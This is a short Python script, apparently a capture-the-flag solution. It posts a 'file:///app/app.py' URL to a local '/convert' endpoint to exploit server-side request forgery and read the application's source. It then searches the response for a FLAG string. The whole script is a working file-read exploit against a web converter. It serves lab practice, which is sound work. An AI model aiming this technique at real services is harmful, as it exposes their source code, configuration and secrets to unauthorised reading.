import urllib.request
import urllib.parse

data = urllib.parse.urlencode({'url': 'file:///app/app.py'}).encode()
req = urllib.request.Request("http://127.0.0.1:32810/convert", data=data, method='POST')

try:
    with urllib.request.urlopen(req, timeout=5) as response:
        print(f"Status: {response.status}")
        content = response.read(10000).decode('utf-8', errors='ignore')
        
        import re
        match = re.search(r'FLAG\{[a-fA-F0-9]{64}\}', content)
        if match:
            print(f"FLAG: {match.group(0)}")
except Exception as e:
    print(f"Error: {e}")

